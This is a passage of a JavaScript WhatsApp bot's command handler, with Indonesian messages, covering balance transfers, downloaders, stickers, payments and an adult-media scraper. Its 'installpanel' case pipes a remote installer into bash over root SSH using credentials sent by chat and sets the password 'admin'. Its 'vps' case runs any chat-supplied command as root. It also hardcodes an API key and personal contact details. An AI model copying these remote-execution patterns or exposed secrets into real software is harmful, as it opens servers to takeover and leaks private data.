        teks += `➠ *Fee* : ${Func.formatNumber(ppn)} [25%]\n`
        teks += `➠ *Remaining Balance* : ${Func.formatNumber(users.balance)}`
        
        reply(teks);
    } else if (text) {
        function no(number) {
            return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
        if (!args || !args[1]) return reply(Func.texted('bold', `🚩 Provide the nominal balance to be transferred.`))
        if (isNaN(args[1])) return reply(Func.texted('bold', `🚩 The balance must be a number.`))
        
        let nominal = parseInt(args[1]);
        let ppn = parseInt(((25 / 100) * nominal).toFixed(0));
        let point = users.balance;
        let user = global.db.data.users;
        
        let hl = [];
        hl[0] = text.split(" ")[0];
        hl[0] = no(hl[0]) + "@s.whatsapp.net";
        
        // Ensure target user exists in the database
        if (!user[hl[0]]) return reply(Func.texted('bold', `🚩 Target user not found in the database.`));
        
        if (nominal > point) return reply(Func.texted('bold', `🚩 Your balance is not enough to make a transfer.`))
        if ((nominal + ppn) > point) return reply(Func.texted('bold', `🚩 Your balance is not enough to pay the transfer fee of 25%`))
        if (nominal < 5000) return reply(Func.texted('bold', `🚩 Nominal balance for transfer is at least 5K.`))
        
        users.balance -= (nominal + ppn);
        user[hl[0]].balance += nominal;
        
        let teks = `乂  *T R A N S F E R*\n\n`
        teks += `“Transfer successfully to *@${hl[0].split("@")[0]}*”\n\n`
        teks += `➠ *Nominal* : ${Func.formatNumber(nominal)}\n`
        teks += `➠ *Fee* : ${Func.formatNumber(ppn)} [25%]\n`
        teks += `➠ *Remaining Balance* : ${Func.formatNumber(users.balance)}`
        
        reply(teks);
    } else {
        let teks = ` *Example* :\n\n`
        teks += `${prefix + command} @⁨WhatsApp⁩ 10000\n`
        teks += `${prefix + command} 10000 (reply chat target)`
        reply(teks);
    }
}
break;
case 'ping':
case 'info': {
    let os = (await import('os')).default;
    let v8 = (await import('v8')).default;
    let { performance } = (await import('perf_hooks')).default;
    let eold = performance.now();

    const used = process.memoryUsage();
    const cpus = os.cpus().map(cpu => {
        cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
        return cpu;
    });
    const cpu = cpus.reduce(
        (last, cpu, _, { length }) => {
            last.total += cpu.total;
            last.speed += cpu.speed / length;
            last.times.user += cpu.times.user;
            last.times.nice += cpu.times.nice;
            last.times.sys += cpu.times.sys;
            last.times.idle += cpu.times.idle;
            last.times.irq += cpu.times.irq;
            return last;
        },
        {
            speed: 0,
            total: 0,
            times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0,
            },
        }
    );
    let heapStat = v8.getHeapStatistics();
    let neow = performance.now();

    let teks = `
*Ping :* *_${Number(neow - eold).toFixed(2)} millisecond(s)_*

💻 *_Server Information_*
*- Hostname :* ${os.hostname()}
*- Platform :* ${os.platform()}
*- OS :* ${os.version()} / ${os.release()}
*- Architecture :* ${os.arch()}
*- RAM Usage :* ${formatSize(os.totalmem() - os.freemem(), false)} / ${formatSize(os.totalmem(), false)}

*_Runtime OS_*
${runtime(os.uptime())}

*_Runtime Bot_*
${runtime(process.uptime())}

*_NodeJS Memory Usage_*
${Object.keys(used)
    .map(key => `*- ${key.padEnd(20)}:* ${formatSize(used[key])}`)
    .join('\n')}
*- Heap Executable :* ${formatSize(heapStat?.total_heap_size_executable)}
*- Physical Size :* ${formatSize(heapStat?.total_physical_size)}
*- Available Size :* ${formatSize(heapStat?.total_available_size)}
*- Heap Limit :* ${formatSize(heapStat?.heap_size_limit)}
*- Malloced Memory :* ${formatSize(heapStat?.malloced_memory)}
*- Peak Malloced Memory :* ${formatSize(heapStat?.peak_malloced_memory)}
*- Does Zap Garbage :* ${heapStat?.does_zap_garbage ? 'Yes' : 'No'}
*- Native Contexts :* ${heapStat?.number_of_native_contexts}
*- Detached Contexts :* ${heapStat?.number_of_detached_contexts}

${
    cpus[0]
        ? `
*_Total CPU Usage_*
Model: ${cpus[0].model.trim()} (${cpu.speed} MHz)
${Object.keys(cpu.times)
    .map(type => `*- ${type.padEnd(10)}:* ${((100 * cpu.times[type]) / cpu.total).toFixed(2)}%`)
    .join('\n')}

*_CPU Core(s) Usage (${cpus.length} Cores)_*
${cpus
    .map(
        (cpu, i) =>
            `${i + 1}. Model: ${cpu.model.trim()} (${cpu.speed} MHz)\n${Object.keys(cpu.times)
                .map(type => `   - ${type.padEnd(10)}:* ${((100 * cpu.times[type]) / cpu.total).toFixed(2)}%`)
                .join('\n')}`
    )
    .join('\n\n')}`
        : ''
}
`.trim();

    await m.reply(teks);
    break;
}

function formatSize(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function runtime(seconds) {
    const d = Math.floor(seconds / (3600 * 24));
    const h = Math.floor((seconds % (3600 * 24)) / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${d}d ${h}h ${m}m ${s}s`;
}


case 'me': case 'profile': {
    let user = global.db.data.users[who];
    let {
        min,
        xp,
        max
    } = await levelling.xpRange(user.level, global.multiplier);
    let math = max - xp;
    if (typeof user == "undefined")
      return m.reply("Pengguna Tidak Berada di Dalam Database");
    let caption = `乂 *U S E R - P R O F I L E*\n\n`
    caption += `${mtA}*Name* : ${user.name ? user.name : dy.getName(who)}\n`
    caption += `${mt}*Age* : ${user.age}\n`
    caption += `${mt}*Balance* : Rp ${Func.formatter(user.balance)}\n`
    caption += `${mt}*Saving* : Rp ${Func.formatter(user.saving)}\n`
    caption += `${mt}*Limit* : ${Func.formatter(user.limit)}\n`
    caption += `${mt}*Exp* : ${Func.h2k(user.exp)}\n`
    caption += `${mt}*Hitstat* : ${user.hit}\n`
    caption += `${mtB}*Loved* : ${user.pasangan ? `@${user.pasangan.split("@")[0]}` : 'gada yahaha'}\n\n`
    caption += `乂 *U S E R -  S T A T U S*\n\n`
    caption += `${mtA}*Verified* : ${user.registered ? '[ √ ]' : '[ × ]'}\n`
    caption += `${mt}*Premium* : ${user.premium ? '[ √ ]' : '[ × ]'}\n`
    caption += `${mt}*Banned* : ${user.banned ? '[ √ ]' : '[ × ]'}\n`
    caption += `${mt}*Level* : ${user.level}\n`
    caption += `${mt}*Role* : ${user.role}\n`
    caption += `${mt}*Exp Min* : (${user.exp - min} / ${xp})\n`
    caption += `${mtB}*Expired* : ${user.expired == 0 ? '-' : msToDate(user.expired - new Date() * 1)}\n\n`
    caption += global.footer
    dy.sendFile(m.chat, ppuser, '', caption, m)
    }
    break

case 'totalfitur': {
reply(`${totalFitur()} Features`)
}
break

case 'bulanan': {
    const limitfree = Func.randomInt(20, 40)
    const limitprem = Func.randomInt(30, 50)
    const moneyfree = Func.randomInt(20000, 50000)
    const moneyprem = Func.randomInt(50000, 100000)
    let user = global.db.data.users[m.sender]

    let time = global.db.data.users[m.sender].lastmonthly + 2592000000
    if (new Date - global.db.data.users[m.sender].lastmonthly < 2592000000) return m.reply(`You've claimed, this monthly claim.\nwait for ${Func.toDate(time - new Date())} again`)
    global.db.data.users[m.sender].balance += isPremium ? moneyprem : moneyfree
    global.db.data.users[m.sender].limit += isPremium ? limitprem : limitfree
    dy.sendText(m.chat, `Congratulations you got it :\n\n+ ${isPremium ? moneyprem : moneyfree} Money\n+ ${isPremium ? limitprem : limitfree} Limit`, m)
    global.db.data.users[m.sender].lastmonthly = new Date * 1
    }
    break

case 'redeem': {
    if (!m.isGroup) return m.reply(mess.group);
    
    let user = global.db.data.users[m.sender];
    let currentTime = new Date().getTime();

    if (!text) {
        return m.reply(Func.example(prefix, command, `dycoders.xyz`));
    }
    
    let redeem = db.data.respon;
    
    // Check if the user has already claimed the current code
    if (user.lastRedeemedCode === redeem) {
        m.reply('Kamu sudah mengklaim kode ini dan tidak bisa mengklaim lagi.');
        return;
    }
    
    // Check if the redeem code has already reached its limit
    if (!global.db.data.redeemCounts) {
        global.db.data.redeemCounts = {};
    }
    
    if (!global.db.data.redeemCounts[redeem]) {
        global.db.data.redeemCounts[redeem] = 0;
    }

    // Ensure global.db.jumlah exists and m.chat is initialized
    if (!global.db.jumlah) {
        global.db.jumlah = {};
    }
    
    if (!global.db.jumlah[m.chat]) {
        global.db.jumlah[m.chat] = 0;
    }

    if (global.db.data.redeemCounts[redeem] >= global.db.jumlah[m.chat]) {
        await m.reply('Kode redeem ini telah mencapai batas maksimum pengklaiman.');
        return;
    }
    
    if (text.toLowerCase() === redeem.toLowerCase()) {
        let limits = randomInt(10, 25);
        let exps = randomInt(20000, 50000);
        let balances = randomInt(20000, 70000);
        user.lastredeem = currentTime;
        user.lastRedeemedCode = redeem; // Store the last redeemed code
        
        m.reply(`*REDEEM BERHASIL*
        
*[ HADIAH ]*
1. Limit: ${limits}
2. Money: ${formatIDR(balances)}
`);
        
        user.limit += limits;
        user.balance += balances;
        
        // Increment the redeem count
        global.db.data.redeemCounts[redeem]++;
    } else {
        m.reply('*[ INVALID REDEEM CODE ]*');
    }
};
break;

case 'claim': {
let timeClaim = 3600000
let claimed = new Date(users.lastclaim + timeClaim)
let timeout = claimed - new Date()
let balance = Func.randomInt(1, 5000)
let limits = Func.randomInt(5, 20)
if (new Date - users.lastclaim >= timeClaim) {
reply(`🎉 Congratulations!, you got +${Func.formatNumber(balance)} balance and +${Func.formatNumber(limits)} limit.`)
users.balance += balance
users.limit += limits
users.lastclaim = new Date() * 1
} else {
reply(`*You have claimed, you can reclaim in the next hour.*\n\n*Timeout : [ ${Func.toTime(timeout)} ]*`)
}
}
break

case 'owner': {
    let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp;ciaa xyzz\nORG:dycoders.xyz\nTITLE:soft\nitem1.TEL;waid=6285719898124:6285719898124\nitem1.X-ABLabel:Ponsel\nitem2.URL:https://dycoders.xyz\nitem2.X-ABLabel:ðŸ’¬ More\nitem3.EMAIL;type=INTERNET:xyydycoders@gmail.com\nitem3.X-ABLabel:Email\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABADR:ðŸ’¬ More\nitem4.X-ABLabel:Lokasi\nEND:VCARD`;
      const sentMsg = await dy.sendMessage(
    m.chat,
    {
      contacts: {
        displayName: ownername,
        contacts: [{ vcard }],
      },
      contextInfo: {
        externalAdReply: {
          title: "M Y  O W N E R",
          body: "THIS MY OWNER YNG GANTENG",
          thumbnailUrl: "https://files.catbox.moe/lx8dx5.jpg",
          mediaType: 1,
          showAdAttribution: true,
          renderLargerThumbnail: true,
        },
      },
    },
    { quoted: fverif },
  );
    }
    break

case 'autodl': {
    if (!isCreator && !isPremium) return reply(mess.premium)

    let value = args[0]
    let options = args[1]

      if (value === "download") {

        if (options == "enable") {
            if (chats.autodl) return reply(`activated`)
            chats.autodl = true
            reply('Successfully Activate Auto Downloader')
        } else if (options == "disable") {
            if (!chats.autodl) return reply(`it's deactivated`)
            chats.autodl = false
            reply('Successfully Disabling Auto Downloader')
        } else m.reply(`select an option, enable or disable`)

    }}
    break
    

case 'bukalapak': {
    if (!text) return m.reply('Masukkan kata kunci untuk mencari produk di BukaLapak!\nContoh: !bukalapak laptop');

    try {
       
        const results = await BukaLapak(text);

       
        if (!results || results.length === 0) {
            return m.reply('Tidak ada produk yang ditemukan untuk pencarian tersebut.');
        }

     
        let message = `🔍 *Hasil Pencarian BukaLapak untuk: ${text}*\n\n`;
        results.slice(0, 5).forEach((product, index) => {
            message += `*${index + 1}. ${product.title}*\n`;
            message += `💰 Harga: ${product.harga}\n`;
            message += `⭐ Rating: ${product.rating}\n`;
            message += `📦 Terjual: ${product.terjual}\n`;
            message += `🛒 Toko: ${product.store.nama} (${product.store.lokasi})\n`;
            message += `🔗 [Link Produk](${product.link})\n\n`;
        });

   
        await dy.sendMessage(from, {
            text: message.trim(),
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'Pencarian Produk di BukaLapak',
                    body: 'Powered by Dycoders Bot',
                    thumbnailUrl: results[0].image,
                    mediaUrl: results[0].link, 
                },
            },
        }, { quoted: fverif });
    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat mengambil data dari BukaLapak. Coba lagi nanti.');
    }
}
break;

    
    
    
  
    case 'hentaivid': {
  try {
    const page = Math.floor(Math.random() * 1153);
    const response = await axios.get(`https://sfmcompile.club/page/${page}`);
    const $ = cheerio.load(response.data);
    const hasil = [];


    $('#primary > div > div > ul > li > article').each(function (a, b) {
      const video_1 = $(b).find('source').attr('src');
      const video_2 = $(b).find('video > a').attr('href');
      const image = $(b).find('img').attr('data-src');

      hasil.push({
        title: $(b).find('header > h2').text(),
        link: $(b).find('header > h2 > a').attr('href'),
        category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
        share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
        views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
        type: video_1 ? 'video' : 'image',
        media: video_1 || video_2 || image
      });
    });

 
    const nano = hasil[Math.floor(Math.random() * hasil.length)];
    const mediaUrl = nano.media;

    if (!mediaUrl || mediaUrl === '') {
      return m.reply('⚠️ Media tidak ditemukan. Coba lagi.');
    }

    if (mediaUrl.includes('.mp4') || nano.type === 'video') {
    
      const media = await axios.get(mediaUrl, { responseType: 'arraybuffer' });
      const uploaded = await Scraper.Uploader.uploadVidey(media.data);

  
      await dy.sendMessage(m.chat, {
        text: `🎥 *${nano.title}*\n📂 *Category:* ${nano.category}\n👀 *Views:* ${nano.views_count}\n🔗 [Source](${nano.link})\n🌐 *video Link:* ${uploaded}`,
      }, { quoted: fverif });
    } else {
     
      await dy.sendMessage(m.chat, { image: { url: mediaUrl }, caption: `🖼️ *${nano.title}*\n📂 *Category:* ${nano.category}\n👀 *Views:* ${nano.views_count}\n🔗 [Source](${nano.link})` }, { quoted: fverif });
    }
  } catch (err) {
    console.error('Error in hentaivid case:', err);
    m.reply('⚠️ Terjadi kesalahan saat mencoba mengambil video. Coba lagi nanti.');
  }
  break;
}

case 'tiktok': {
    if (!text) return m.reply('Masukkan URL TikTok!');

    const axios = require('axios');
    const fs = require('fs');
    const path = require('path');

    try {
       
        const apiTiktok = `https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(text)}`;
        const response = await axios.get(apiTiktok);
        const data = response.data;

        
        if (!data || data.status !== 200 || !data.result || !data.result.video) {
            return m.reply("Gagal mengambil data dari TikTok. Pastikan link valid.");
        }

      
        const { desc, statistics, video } = data.result;

       
        const filePath = path.join(__dirname, 'tmp', `tiktok_video_${Date.now()}.mp4`);

       
        const videoResponse = await axios({
            method: 'get',
            url: video,
            responseType: 'stream'
        });

      
        if (!fs.existsSync(path.join(__dirname, 'tmp'))) {
            fs.mkdirSync(path.join(__dirname, 'tmp'));
        }

       
        const writer = fs.createWriteStream(filePath);
        videoResponse.data.pipe(writer);

      
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

      
        const caption = `*T I K T O K - D O W N L O A D E R*\n\n` +
            `◦ *Deskripsi*: ${desc || 'Tidak ada deskripsi'}\n` +
            `◦ *Suka*: ${statistics.likeCount || '0'}\n` +
            `◦ *Komentar*: ${statistics.commentCount || '0'}\n` +
            `◦ *Bagikan*: ${statistics.shareCount || '0'}\n`;

      
        await dy.sendMessage(from, { 
            video: { url: filePath }, 
            caption: caption 
        }, { quoted: fverif });

     

    } catch (error) {
        console.error("Error:", error);
        m.reply("Terjadi kesalahan saat mengambil data dari TikTok. Pastikan link atau API berfungsi dengan benar.");
    }
    break;
}




case 'ssweb': {
    if (!text) return m.reply('Masukkan URL untuk di-screenshot!');

    let sswebfull = `https://api.apiflash.com/v1/urltoimage?access_key=9a202a61afaa4ba0877f12f03e86ea96&url=${encodeURIComponent(text)}&format=png&fresh=true&full_page=true&response_type=json&no_cookie_banners=true&no_ads=true&no_tracking=true&time_zone=Asia/Jakarta`;

    try {
     
        let response = await fetch(sswebfull);
        let json = await response.json();

     
        if (!json.url) {
            return m.reply('Gagal mengambil screenshot. Pastikan URL yang dimasukkan valid.');
        }

  
        await dy.sendMessage(from, {
            image: { url: json.url },
            caption: `BRUH`
        }, { quoted: fverif });

    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat mengambil screenshot. Coba lagi nanti.');
    }
}
break;






case 'audio': {
if (limitnya < 1) return m.reply(mess.limit)
if (!m.quoted) return reply('Reply Pesan');

    // Regex untuk mendeteksi berbagai format URL YouTube
    let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);

    if (!urls) 
        return reply('Mungkin pesan yang anda reply tidak mengandung URL YouTube');

   // reply(mess.wait);

    // Memastikan text adalah indeks yang valid untuk urls
    let urlIndex = parseInt(text) - 1;
    if (urlIndex < 0 || urlIndex >= urls.length) 
        return reply('Indeks URL tidak valid');

    // Panggil fungsi downloadMp3 dengan URL yang terpilih
    await downloadMp3(urls);
uselimit()}
break;
case "genimg": {
    if (!text) return m.reply("Silakan masukkan prompt untuk gambar.");
    
   

    async function cimg(prompt) {
      try {
        const response = await axios.get(`https://imgen.duck.mom/prompt/${prompt}`);
        const imageUrl = response.request.res.responseUrl;
        return imageUrl;
      } catch (error) {
        console.error(error);
        return null;
      }
    }

    const imgUrl = await cimg(text);
    if (imgUrl) {
        await m.reply({ text: `cihh` });
        await dy.sendMessage(m.chat, { image: { url: imgUrl }, caption: "Generated Image" });
    } else {
        await m.reply("Terjadi kesalahan dalam menghasilkan gambar.");
    }
}
break;



case "installpanel": {
    if (!isCreator) return m.reply("BUKAN DY");
    if (!text) return m.reply("ipvps|pwvps|panel.com");
    
    let vii = text.split("|");
    if (vii.length < 3) 
        return m.reply("ipvps|pwvps|panel.com");

    const ress = new Client();
    const connSettings = {
        host: vii[0],
        port: '22',
        username: 'root',
        password: vii[1],
    };

    const pass = "admin";
    let passwordPanel = pass;
    const domainpanel = vii[2];
    const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;

    async function instalPanel() {
        ress.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*INSTALL WINGS TERPISAH*
`;
                await m.reply(teks);
            }).on('data', (data) => {
                handleStreamInput(data, stream, {
                    'Input 0-6': "0",
                    '(y/N)': "y",
                    'Database name (panel)': "\n",
                    'Database username (pterodactyl)': "admin",
                    'Password (press enter to use randomly generated password)': "admin",
                    'Select timezone [Europe/Stockholm]': "Asia/Jakarta",
                    'Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl': "dyccoders@gmail.com",
                    'Email address for the initial admin account': "dyccoders@gmail.com",
                    'Username for the initial admin account': "admin",
                    'First name for the initial admin account': "admin",
                    'Last name for the initial admin account': "admin",
                    'Password for the initial admin account': passwordPanel,
                    'Set the FQDN of this panel (panel.example.com)': domainpanel,
                    'Do you want to automatically configure UFW (firewall)': "y",
                    'Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)': "y",
                    'Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)': "1",
                    'I agree that this HTTPS request is performed (y/N)': "y",
                    'Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)': "y",
                    '(yes/no)': "y",
                    'Initial configuration completed. Continue with installation? (y/N)': "y",
                    'Still assume SSL? (y/N)': "y",
                    'Please read the Terms of Service': "y",
                    '(A)gree/(C)ancel:': "A",
                });
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    ress.on('ready', async () => {
        await m.reply("*SABAR YA OM LAGI DI INSTALL*");
        await instalPanel();
    }).connect(connSettings);

    function handleStreamInput(data, stream, mappings) {
        const input = data.toString();
        for (const [prompt, response] of Object.entries(mappings)) {
            if (input.includes(prompt)) {
                stream.write(response + '\n');
            }
        }
    }
}
break;
case 'vps': {
    if (!isCreator) return m.reply("BUKAN DY");
    if (!text) return m.reply("Masukkan perintah untuk dijalankan di VPS! Contoh: !vps ls");

    let vii = text.split("|");
    if (vii.length < 1) 
        return m.reply("Masukkan perintah VPS yang ingin dijalankan.");

    const ress = new Client();
    const connSettings = {
        host: 'isi dengan ip vps lu',  
        port: '22',             
        username: 'root',       
        password: 'isi sama password vps lu', 
    };

    const commandToRun = vii[0];  

    async function executeVpsCommand() {
        ress.exec(commandToRun, (err, stream) => {
            if (err) throw err;
            let output = '';
            stream.on('close', async (code, signal) => {
                let teks = `
${output}
`;

                await m.reply(teks);
            }).on('data', (data) => {
                output += data.toString();  
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    ress.on('ready', async () => {
        await executeVpsCommand(); 
    }).connect(connSettings);
}
break;

        
        
        
        
        
        
        
case "play2": {
if (!text) return reply(`*Example:* ${prefix + command} photograph`)
const yts = require('yt-search');
let search = await yts(text);
let telaso = search.all[0].url;
var response = await ytdlBaru(telaso)
var puki = response.data.mp3
dy.sendMessage(m.chat, { audio: { url: puki },
mimetype: "audio/mpeg",
fileName: "kiuu.mp3",
contextInfo: {
forwardingScore: 99999999999,
isForwarded: true,
externalAdReply: {
showAdAttribution: false,
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
title: search.all[0].title,
body: `Song duration: ${search.all[0].timestamp}`,
previewType: "PHOTO",
thumbnailUrl: search.all[0].thumbnail,
}}},{quoted:m })
}
break

case 'play': {
    if (!text) return reply(`Example : ${prefix + command} membasuh`)
    
   
    let wait = await dy.sendMessage(m.chat, {
        text: `_Searching.. [ ${text} ] 🔍_`
    }, {
        quoted: fopenai,
        ephemeralExpiration: 86400
    })
    
   
    let search = await yts(`${text}`)
    let data = await search.all.filter((v) => v.type == 'video')
    
    try {
        var res12 = data[0]
    } catch {
        var res12 = data[1]
    }
    
  
    let ply = search.videos[0].url
    
   
    let pl = await Scraper.Ytdl.download(ply, 'mp3', '128')
    
   
    await dy.sendMessage(m.chat, {
        text: `_Mengirim.. [ ${text} ] _💬`,
        edit: wait.key
    }, {
        quoted: fverif,
        ephemeralExpiration: 86400
    });
    

    await dy.sendMessage(m.chat, {
        audio: pl.buffer,
        mimetype: 'audio/mp4',
        ptt: false 
    }, { quoted: fverif })
    
   
    dy.sendMessage(m.chat, {
        react: {
            text: '🎧',
            key: m.key
        }
    })
    break
}


case 'stickersearch': {
    if (!text) return m.reply('Masukkan kata kunci untuk mencari stiker!\nContoh: !stickersearch hello');

    try {
      
        const result = await stickersearch(text);

        
        if (!result || result.sticker.length === 0) {
            return m.reply('Tidak ada stiker ditemukan untuk kata kunci tersebut.');
        }

        
        let message = `🔍 *Hasil Pencarian Stiker:*\n\n`;
        message += `📦 *Paket*: ${result.title}\n`;
        message += `✍️ *Pembuat*: [${result.author}](${result.author_link})\n\n`;
        message += `Terdapat ${result.sticker.length} stiker di dalam paket ini.`;

        await dy.sendMessage(from, {
            text: message,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'Pencarian Stiker',
                    body: result.title,
                    thumbnailUrl: result.sticker[0], 
                    mediaUrl: result.author_link, 
                },
            },
        }, { quoted: fverif });

       
        for (let i = 0; i < Math.min(result.sticker.length, 3); i++) {
            const stickerUrl = result.sticker[i];
            await dy.sendMessage(from, {
                sticker: { url: stickerUrl },
            }, { quoted: fverif });
        }
    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat mencari stiker. Coba lagi nanti.');
    }
}
break;



case'mediafire':{
if (limitnya < 1) return m.reply(mess.limit)
let input = `*Example*: ${prefix + command} https://www.mediafire.com/file/pwxob70rpgma9lz/GBWhatsApp_v8.75%2528Tutorial_Yud%2529.apk/file*`
	if (!text) return reply(input)
	const baby1 = await mediafire(text)
	if (baby1.filesize.split('MB')[0] >= 100) return reply('*File Over Limit* ' + util.format(baby1))
				await sleep(500)
				const result = `*MEDIAFIRE DOWNLOADER*

📄 *Name* : ${baby1.filename}
⚖️ *Size* : ${baby1.filesize}
📨 zType* : ${baby1.filetype}
🔗 *Link* : ${baby1.link}
📋 *UploadAt*: ${baby1.uploadAt}
`
dy.sendFile(m.chat, baby1.link || result, `${baby1.filename}`, '', m, null, { mimetype: `${baby1.filetype}`, asDocument: true })
uselimit()}
break



case 'ytmp4': {
if (limitnya < 1) return m.reply(mess.limit)
if (m.isGroup) {
reply(`Bot Telah Mengirimkan Video Di Private Chat !!!`)}
if (!text) return reply(`*Example*: ${prefix + command} https://www.youtube.com/xxxxxxx`)
/*dy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let searchResponse = await ytdlnew(text)
dy.sendMessage(sender, { video: {url: searchResponse.mp4DownloadLink}, caption: '' },
{ quoted:m})*/
downloadMp4(text)
uselimit()}
break
    
    case 'ytmp3': {
    if (limitnya < 1) return m.reply(mess.limit)
if (!text) return reply(` *Example :* .${command} https://www.youtube.com/xxxxxxx`)
/*dy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let searchResponse = await ytdlnew(text)
dy.sendMessage(m.chat, { audio: {url: searchResponse.mp3DownloadLink}, mimetype: "audio/mp4", ptt: true},{quoted:m})*/
downloadMp3(text)
uselimit()}
break
//BATAS DOWNLOAD MENU

//CONVERT MENU

case'stext':{
if (!text) return reply(`*Example:* ${prefix + command} Tes`)
dy.sendReact(m.chat, "🕛", m.key )
let uploadImage = require ("./lib/uploadImage")
let json = {
type: 'stories',
format: 'png',
backgroundColor: '#1b1e23',
width: 512,
height: 720,
scale: 4,
watermark: 'dycoders.xyz.me',
messages: [{
entities: 'auto',
avatar: true,
from: {
id: 18,
name: await dy.getName(m.sender),
photo: {
url: await dy.profilePictureUrl(m.sender, 'image').catch(_ => "https://telegra.ph/file/662564e95a8fe4c21cb33.jpg")}},
text: text }, 
]};
const { data } = await axios.post('https://dikaardnt.com/api/maker/quote', json);
var media = Buffer.from(data.image, 'base64')
var res = await uploadImage(media)
dy.sendReact(m.chat, "✅", m.key )
dy.sendMessage(m.chat, { image: { url:res }, caption: ''},{quoted: fverif })
}
break

case 'upvidey': case 'uploadvidey': {
    if (!/video/.test(mime)) return m.reply(`*Send/Reply the Video With Caption* ${prefix + command}`)
    if (!quoted) return m.reply(`*Send/Reply the Video Caption* ${prefix + command}`)
    let media = await quoted.download()
    let result = await Scraper.Uploader.uploadVidey(media)
    dy.reply(m.chat, result, m)
    }
    break

case 'tomp4': case 'tovideo': case 'tovid': {
    if (!m.quoted) return m.reply(`Reply sticker with caption *${prefix + command}*`)
    if (!/webp/.test(mime)) return m.reply(`Reply sticker with caption *${prefix + command}*`)
    const {
        webp2mp4
    } = require('./lib/webp2mp4.js')
    let media = await m.quoted.download()
    let out = Buffer.alloc(0)
    if (/webp/.test(mime)) {
        out = await webp2mp4(media)
    }
    // await dy.sendFile(m.chat, out, 'out.gif', wm, m, 0, { mimetype: 'video/gif', thumbnail: Buffer.alloc(0) })
    dy.sendMessage(from, {
        video: {
            url: out,
            caption: 'Convert Webp To Video'
        },
        gifPlayback: false
    }, {
        quoted: fverif
    })
    }
    break

case 'brat': {
    if (!text) return m.reply('Contoh: .brat hello world');

    try {
        const apiBrat = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`;
        const response = await fetch(apiBrat);
        if (!response.ok) throw new Error('error report ke owner');

       
        const buffer = await response.buffer();

   
        const encmedia = await dy.sendImageAsSticker(from, buffer, fverif, {
            packname: global.packname,
            author: global.author 
        });

     
        await fs.unlinkSync(encmedia);
    } catch (error) {
        console.error(error);
        m.reply('bauu');
    }
}
break;


case 'sticker': case 's': case 'stickergif': case 'sgif': {
    if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
    if (/image/.test(mime)) {
        let media = await quoted.download()
        let encmedia = await dy.sendImageAsSticker(from, media, fverif, {
            packname: global.packname,
            author: global.author
        })
        await fs.unlinkSync(encmedia)
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
        let media = await quoted.download()
        let encmedia = await dy.sendVideoAsSticker(from, media, fverif, {
            packname: global.packname,
            author: global.author
        })
        await fs.unlinkSync(encmedia)
    } else {
        m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
    }
    }
    break
    
    case "sendpayment":
case "payment":
case "pay":
case "listpayment": {
  const url = "https://telegra.ph/file/662564e95a8fe4c21cb33.jpg";

  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: dy.waUploadToServer
    });
    return imageMessage;
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `Berikut List Payment Saya Yah`
            },
            carouselMessage: {
              cards: [
                {
                  header: {
                    imageMessage: await image('https://telegra.ph/file/c605b34f0d4f0127735b4.jpg'),
                    hasMediaAttachment: true,
                  },
                  body: { text: `> COPY DANA DIBAWAH` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
                        "buttonParamsJson": "{\"display_text\":\"PAYMENT DANA 🎐\",\"id\":\"123456789\",\"copy_code\":\"083877804993\"}"
                      },
                    ],
                  },
                },
                {
                  header: {
                    imageMessage: await image('https://files.catbox.moe/s5oi1u.jpg'),
                    hasMediaAttachment: true,
                  },
                  body: { text: `> SCAN QRIS ATAU COPY URL DI BAWAH` },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        "name": "cta_copy",
